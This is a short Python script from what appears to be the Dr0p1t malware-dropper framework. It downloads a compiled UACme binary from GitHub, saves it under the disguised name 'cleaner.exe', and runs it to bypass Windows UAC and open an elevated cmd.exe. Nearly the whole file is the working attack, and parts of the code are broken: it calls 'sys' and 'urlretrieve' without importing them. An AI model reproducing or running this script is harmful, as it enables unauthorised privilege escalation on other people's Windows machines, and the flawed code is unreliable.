#((Todo list))
#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to bypass UAC by downloading and using UACme tool (¯\_(ツ)_/¯)
#Start
from os import popen
from sys import version_info
from platform import architecture
if sys.version_info[0]==3:
	from urllib.request import urlopen
elif sys.version_info[0]==2:
	from urllib import urlopen

def get_ready():
    import urllib,platform,os
    url32 = "https://github.com/hfiref0x/UACME/raw/master/Compiled/Akagi32.exe"
    url64 = "https://github.com/hfiref0x/UACME/raw/master/Compiled/Akagi64.exe"
    url   = ""
    #check architecture
    if architecture()[0][:2] == '64':
        url = url64
    elif architecture()[0][:2] == '32':
        url = url32
    x = urlretrieve(url,"cleaner.exe")
    xx = popen("cleaner.exe 3 cmd.exe")
